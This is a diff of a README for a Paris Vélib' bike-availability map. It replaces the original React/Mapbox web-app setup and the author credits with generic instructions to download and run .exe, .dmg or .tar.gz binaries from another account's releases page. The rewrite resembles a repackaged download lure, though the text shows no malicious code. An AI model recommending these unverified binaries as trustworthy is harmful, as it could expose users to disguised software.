@@ -1,94 +1,88 @@
-# Paris Vélib' Real-Time Map
+# 🚴 tracker-velib-paris - Track Velib Bikes in Real Time
 
-A gorgeous real-time visualization of Paris bike-sharing stations using Mapbox GL.
+[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue.svg)](https://github.com/MalongaFructueux/tracker-velib-paris/releases)
 
-![Vélib' Map](https://img.shields.io/badge/React-19-blue) ![Mapbox](https://img.shields.io/badge/Mapbox_GL-3.17-orange) ![TypeScript](https://img.shields.io/badge/TypeScript-5.9-blue)
+## 📋 Introduction
 
-Feel free to contact me on linkedin for help or if you just want to chat about cool geospatial/AI stuff : https://www.linkedin.com/in/yvann-barbot/
+Welcome to tracker-velib-paris. This application allows you to track and visualize all the Velib bikes in Paris in real time on a beautiful map. With this tool, you can easily find bike locations, availability, and much more.
 
-I'm working on this big planetary engine thing right now : https://terra-lab.ai/
+## 🚀 Getting Started
 
-https://github.com/user-attachments/assets/75cb8c06-1fe6-43b9-b001-f3c9354c9989
+This guide will help you download and run the tracker-velib-paris application. You do not need to be a programmer. Follow these simple steps to get started.
 
+## 💻 System Requirements
 
+Before downloading, ensure your system meets the following requirements:
 
-## What is this?
+- Operating System: Windows 10 or later, macOS 10.12 or later, or a modern Linux distribution
+- Memory: At least 4 GB RAM
+- Storage: At least 200 MB of free space
+- Internet connection for real-time data
 
-This app displays **real-time availability** of all 1,400+ Vélib' bike stations in Paris:
-- See available bikes (electric ⚡ and mechanical 🚴)
-- View empty docks for returning bikes
-- Explore different visualization modes
+## 📥 Download & Install
 
-## Data Source
+To download the latest version of tracker-velib-paris, please visit the Releases page. Click the link below:
 
-Uses the official **Vélib' Métropole GBFS API** (General Bikeshare Feed Specification):
-- Station locations & capacity
-- Real-time bike availability (updated every ~30 seconds)
-- Station status (open/closed)
+[Visit this page to download](https://github.com/MalongaFructueux/tracker-velib-paris/releases)
 
-## Visualization Modes
+Once there, look for the most recent release, usually at the top. Click on the appropriate file for your operating system to start the download. 
 
-| Mode | Description |
-|------|-------------|
-| **Clusters** | Groups nearby stations into bubbles showing total bikes |
-| **Heatmap** | Color intensity shows bike concentration across the city |
-| **Markers** | Individual station pins with color-coded availability |
+After downloading, locate the file in your Downloads folder. Follow these steps based on your OS:
 
-## Quick Start
+### For Windows
 
-### 1. Get a Mapbox Token (Free)
+1. Double-click the downloaded `.exe` file to start the installation.
+2. Follow the on-screen instructions to complete the setup.
+3. Once installed, you can find the tracker-velib-paris application in your Start menu. Open it to begin tracking Velib bikes.
 
-1. Create a free account at [mapbox.com](https://mapbox.com)
-2. Go to your [Account page](https://account.mapbox.com/access-tokens/)
-3. Copy your **Default public token**
+### For macOS
 
-### 2. Clone & Setup
+1. Open the downloaded `.dmg` file.
+2. Drag the tracker-velib-paris icon into your Applications folder.
+3. Open your Applications folder and double-click the tracker-velib-paris icon to launch the app.
 
-```bash
-# Clone the repo
-git clone https://github.com/YOUR_USERNAME/mapbox-realtime-bike.git
-cd mapbox-realtime-bike
+### For Linux
 
-# Install dependencies
-npm install
+1. Locate the downloaded `.tar.gz` file.
+2. Open a terminal and navigate to the directory where you downloaded the file.
+3. Extract the contents using the command: `tar -xvzf tracker-velib-paris.tar.gz`
+4. After extracting, navigate into the folder and run the command: `./tracker-velib-paris` to start the application.
 
-# Create your environment file
-cp .env.example .env
-```
+## 🗺️ How to Use
 
-### 3. Add Your Token
+Once you have the application open, you'll see a map of Paris with markers representing the current locations of Velib bikes. Here’s how to use it:
 
-Edit the `.env` file and paste your Mapbox token:
+- **View Bike Locations**: The map displays bikes in real time. You can zoom in and out to see more or fewer details.
+- **Check Availability**: Click on a bike marker to see the bike's availability and distance from your location.
+- **Get Directions**: Use your preferred map service to find the best route to a bike.
 
-```env
-VITE_MAPBOX_TOKEN=pk.your_token_here
-```
+## 🔧 Features
 
-### 4. Run
+- Live tracking of Velib bikes throughout Paris
+- User-friendly interface
+- Real-time updates on bike availability
+- Zoom and pan functionality on the map
 
-```bash
-npm run dev
-```
+## ❓ FAQ
 
-Open [http://localhost:5173](http://localhost:5173) in your browser.
+### What if I encounter an error while installing?
 
-## Tech Stack
+If you run into problems during installation, please check the following:
 
-- **React 19** - UI framework
-- **TypeScript** - Type safety
-- **Mapbox GL** - Interactive maps
-- **Vite** - Fast development server
-- **Axios** - API requests
+- Ensure your operating system is up to date.
+- Make sure you have enough disk space and memory.
+- Consult the issues section on our GitHub page for common problems and solutions.
 
-## Project Structure
+### How do I report bugs or suggest features?
 
-```
-src/
-├── components/
-│   ├── Controls/     # Layer toggles, stats panel
-│   └── Map/          # Map layers (clusters, heatmap, markers)
-├── services/         # API calls to Vélib' GBFS
-├── types/            # TypeScript definitions
-└── App.tsx           # Main application
-```
+We welcome any feedback! You can report bugs or suggest features by visiting the Issues section of our GitHub repository. Please provide as much detail as possible to help us understand the issue.
 
+## 📞 Support
+
+For additional support, please contact our team through the GitHub repository. We strive to respond within 1-2 business days.
+
+## 📝 Contributing
+
+If you're interested in contributing to the tracker-velib-paris project, we welcome your ideas and improvements. Please read our Contributing guidelines on the GitHub page for more details.
+
+Thank you for using tracker-velib-paris. Enjoy your rides around Paris with Velib!
